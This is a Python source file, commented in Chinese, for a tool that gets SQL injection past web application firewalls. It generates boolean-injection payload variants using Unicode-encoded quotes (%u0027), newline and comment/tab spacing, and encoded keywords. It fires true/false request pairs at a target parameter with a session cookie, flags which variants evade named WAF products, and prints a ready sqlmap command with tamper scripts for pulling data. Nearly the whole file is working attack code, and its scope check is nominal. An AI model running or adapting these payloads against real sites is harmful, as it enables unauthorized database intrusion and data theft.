#!/usr/bin/env python3
"""WAF 下 SQL 注入：Unicode(%uXXXX) / 换行(%0a/%0d) 变异 + 布尔差分探针。

对齐 Playbook：传承/隐鳞·折行.md

示例:
  # 只生成变异（不发请求）
  python3 炼蛊房/waf_sqli_bypass.py mutate --base-value 2024

  # 授权站布尔探针（需 Cookie）
  python3 炼蛊房/waf_sqli_bypass.py probe \\
    --url 'https://授权站/path.do' --param xnm --base-value 2024 \\
    --cookie 'SESS=...' --case <案卷>
"""
from __future__ import annotations

import argparse
import hashlib
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-waf_sqli_bypass"



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "waf_sqli"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")


def to_unicode_url(s: str) -> str:
    """字符 → %uXXXX（WAF 常漏解码；后端/中间件偶发二次解码成 '）。"""
    out = []
    for ch in s:
        o = ord(ch)
        if o < 256:
            out.append(f"%u00{o:02X}")
        else:
            out.append(f"%u{o:04X}")
    return "".join(out)


def mutate_payloads(base: str, suffix_true: str = "' AND 1=1--", suffix_false: str = "' AND 1=2--") -> list[dict[str, str]]:
    """对引号/关键字做 Unicode、换行、混合变异。"""
    variants: list[dict[str, str]] = []

    def add(name: str, true_p: str, false_p: str) -> None:
        variants.append({"name": name, "true": true_p, "false": false_p})

    # 0) 明文基线（多半被 WAF 拦）
    add("plain", base + suffix_true, base + suffix_false)

    # 1) 仅引号 Unicode：2024%u0027+AND+1=1--
    q = "%u0027"
    add(
        "unicode_quote",
        f"{base}{q}+AND+1=1--",
        f"{base}{q}+AND+1=2--",
    )

    # 2) 换行打断签名：2024%0aAND+1=1--
    for nl, tag in (("%0a", "lf"), ("%0d", "cr"), ("%0d%0a", "crlf")):
        add(
            f"newline_{tag}",
            f"{base}{nl}AND+1=1--",
            f"{base}{nl}AND+1=2--",
        )

    # 3) Unicode 引号 + 换行
    add(
        "unicode_quote_lf",
        f"{base}%u0027%0aAND+1=1--",
        f"{base}%u0027%0aAND+1=2--",
    )

    # 4) 空格 → /**/ / %09
    add(
        "unicode_quote_comment_space",
        f"{base}%u0027/**/AND/**/1=1--",
        f"{base}%u0027/**/AND/**/1=2--",
    )
    add(
        "unicode_quote_tab",
        f"{base}%u0027%09AND%091=1--",
        f"{base}%u0027%09AND%091=2--",
    )

    # 5) 关键字部分 Unicode（AND / OR）
    and_u = to_unicode_url("AND")
    add(
        "unicode_and",
        f"{base}%u0027+{and_u}+1=1--",
        f"{base}%u0027+{and_u}+1=2--",
    )

    # 6) 整段后缀 Unicode（激进）
    add(
        "unicode_suffix",
        base + to_unicode_url(suffix_true.replace(" ", "+")).replace("%u002B", "+"),
        base + to_unicode_url(suffix_false.replace(" ", "+")).replace("%u002B", "+"),
    )
    return variants


def _payload_for_query(raw_value: str) -> str:
    """已含 %u/%0a 等变异则不再 quote；明文基线要编码以免空格/引号拆坏请求。"""
    if any(tok in raw_value for tok in ("%u", "%0a", "%0d", "%09", "/**/")):
        return raw_value
    return urllib.parse.quote(raw_value, safe="")


def build_url(url: str, param: str, raw_value: str, extra: dict[str, str] | None = None) -> str:
    """拼查询串：Unicode/换行变异禁止二次 quote。"""
    parts = urllib.parse.urlsplit(url)
    q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    if extra:
        q.update(extra)
    others = [(k, v) for k, v in q.items() if k != param]
    enc = urllib.parse.urlencode(others, doseq=True)
    piece = f"{param}={_payload_for_query(raw_value)}"
    new_q = f"{enc}&{piece}" if enc else piece
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_q, parts.fragment))


def ssl_ctx(insecure: bool = False) -> ssl.SSLContext:
    if insecure:
        return ssl._create_unverified_context()
    return ssl.create_default_context()


def http_get(url: str, cookie: str = "", timeout: int = 25, insecure: bool = False) -> dict[str, Any]:
    hdrs = {"User-Agent": UA, "Accept": "*/*"}
    if cookie:
        hdrs["Cookie"] = cookie
    ctx = ssl_ctx(insecure)
    req = urllib.request.Request(url, headers=hdrs, method="GET")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            raw = r.read()[:800_000]
            body = raw.decode("utf-8", "replace")
            return {
                "status": r.status,
                "len": len(raw),
                "sha1": hashlib.sha1(raw).hexdigest()[:16],
                "body_head": body[:400],
                "blocked": _looks_blocked(r.status, body),
            }
    except urllib.error.HTTPError as e:
        raw = e.read()[:200_000] if e.fp else b""
        body = raw.decode("utf-8", "replace")
        return {
            "status": e.code,
            "len": len(raw),
            "sha1": hashlib.sha1(raw).hexdigest()[:16] if raw else "",
            "body_head": body[:400],
            "blocked": _looks_blocked(e.code, body),
        }
    except Exception as e:
        return {"status": 0, "error": str(e), "len": 0, "sha1": "", "body_head": "", "blocked": False}


def _looks_blocked(status: int, body: str) -> bool:
    if status in (403, 406, 429, 503):
        return True
    b = (body or "").lower()
    keys = ("waf", "拦截", "攻击", "forbidden", "not acceptable", "web firewall", "safedog", "云锁", "玄武")
    return any(k in b for k in keys)


def cmd_mutate(args: argparse.Namespace) -> int:
    rows = mutate_payloads(args.base_value)
    out = {"ts": _now(), "base_value": args.base_value, "variants": rows}
    text = json.dumps(out, ensure_ascii=False, indent=2)
    if args.case:
        path = case_dir(args.case) / "mutations.json"
        path.write_text(text + "\n", encoding="utf-8")
        print(f"[ok] {len(rows)} variants -> {path}")
    else:
        print(text)
    for r in rows:
        print(f"  [{r['name']}] true={r['true'][:80]}")
    return 0


def cmd_probe(args: argparse.Namespace) -> int:
    ensure_scope(args.url)
    extra = {}
    if args.extra:
        for pair in args.extra.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                extra[k] = v

    variants = mutate_payloads(args.base_value)
    if args.only:
        allow = {x.strip() for x in args.only.split(",") if x.strip()}
        variants = [v for v in variants if v["name"] in allow]

    results = []
    for v in variants:
        u_true = build_url(args.url, args.param, v["true"], extra)
        u_false = build_url(args.url, args.param, v["false"], extra)
        r1 = http_get(u_true, cookie=args.cookie, timeout=args.timeout, insecure=args.insecure)
        r2 = http_get(u_false, cookie=args.cookie, timeout=args.timeout, insecure=args.insecure)
        diff = (
            r1.get("status") != r2.get("status")
            or r1.get("len") != r2.get("len")
            or r1.get("sha1") != r2.get("sha1")
        )
        interesting = bool(diff and not r1.get("blocked") and not r2.get("blocked"))
        # 过 WAF 信号：变异返回 200 且体长明显大于疑似拦截页
        passed = int(r1.get("status") or 0) == 200 and int(r1.get("len") or 0) > 1500
        row = {
            "name": v["name"],
            "true_payload": v["true"],
            "false_payload": v["false"],
            "true_url": u_true,
            "false_url": u_false,
            "true": {k: r1.get(k) for k in ("status", "len", "sha1", "blocked", "error")},
            "false": {k: r2.get(k) for k in ("status", "len", "sha1", "blocked", "error")},
            "diff": diff,
            "interesting": interesting,
            "waf_pass_candidate": passed,
        }
        results.append(row)
        if interesting:
            flag = "HIT"
        elif r1.get("blocked") or r2.get("blocked"):
            flag = "block"
        elif passed:
            flag = "pass"
        else:
            flag = "miss"
        print(
            f"  [{flag}] {v['name']}  "
            f"T={r1.get('status')}/{r1.get('len')} F={r2.get('status')}/{r2.get('len')} "
            f"blocked={r1.get('blocked') or r2.get('blocked')}"
        )

    hits = [r for r in results if r.get("interesting")]
    passes = [r for r in results if r.get("waf_pass_candidate")]
    report = {
        "ts": _now(),
        "url": args.url,
        "param": args.param,
        "base_value": args.base_value,
        "hit_count": len(hits),
        "waf_pass_count": len(passes),
        "results": results,
        "note": "HIT=布尔真假差分；pass=疑似过 WAF（200+长包）但真假同长；非自动拉库",
    }
    out = case_dir(args.case)
    path = out / "probe.json"
    path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[ok] hits={len(hits)} passes={len(passes)} /{len(results)} -> {path}")
    if hits:
        print("[next] 差分成立 → 用同一变异喂 sqlmap --tamper=charunicodeencode 或手工布尔取数（遵守案卷授权范围）")
        print(sqlmap_hint(args.url, args.param, args.cookie, hits[0]["name"]))
    elif passes:
        print("[next] 已过 WAF 但无布尔差分 → 换参数/改 POST/看业务回显；勿直接当注入确认")
    return 0 if hits else 2


def sqlmap_hint(url: str, param: str, cookie: str, variant: str) -> str:
    # 占位 * 供 sqlmap；Unicode 类建议自定义 tamper 或 --tamper=charunicodeencode
    tip = (
        f"sqlmap -u '{url}?{param}=2024*' "
        f"--cookie='{cookie or 'SESS'}' --batch --technique=B "
        f"--tamper=charunicodeencode,space2comment "
        f"# variant_hint={variant}；换行类可再加自定义 tamper 插入 %0a"
    )
    return tip


def cmd_sqlmap_hint(args: argparse.Namespace) -> int:
    print(sqlmap_hint(args.url, args.param, args.cookie, args.variant or "unicode_quote"))
    print("# 仓库内 sqlmap: tools/arsenal/bin/sqlmap 或 tools/vendor/03-exploit/sqlmap/sqlmap.py")
    print("# 内置接近本手法: tamper/charunicodeencode.py （%uXXXX）")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="WAF SQLi Unicode/换行绕过")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("mutate", help="只生成变异 payload")
    p.add_argument("--base-value", default="2024")
    p.add_argument("--case", default="")
    p.set_defaults(func=cmd_mutate)

    p = sub.add_parser("probe", help="授权站布尔差分探针")
    p.add_argument("--url", required=True, help="端点（可含已有 query）")
    p.add_argument("--param", required=True, help="注入参数名，如 xnm")
    p.add_argument("--base-value", default="2024")
    p.add_argument("--cookie", default="")
    p.add_argument("--extra", default="", help="附加 query，如 xqm=1")
    p.add_argument("--case", required=True)
    p.add_argument("--only", default="", help="只测这些变异名，逗号分隔")
    p.add_argument("--timeout", type=int, default=25)
    p.add_argument("--insecure", action="store_true", help="跳过 TLS 校验（教务站常见缺链）")
    p.set_defaults(func=cmd_probe)

    p = sub.add_parser("sqlmap-hint", help="打印 sqlmap 建议命令")
    p.add_argument("--url", required=True)
    p.add_argument("--param", default="xnm")
    p.add_argument("--cookie", default="")
    p.add_argument("--variant", default="unicode_quote")
    p.set_defaults(func=cmd_sqlmap_hint)

    args = ap.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
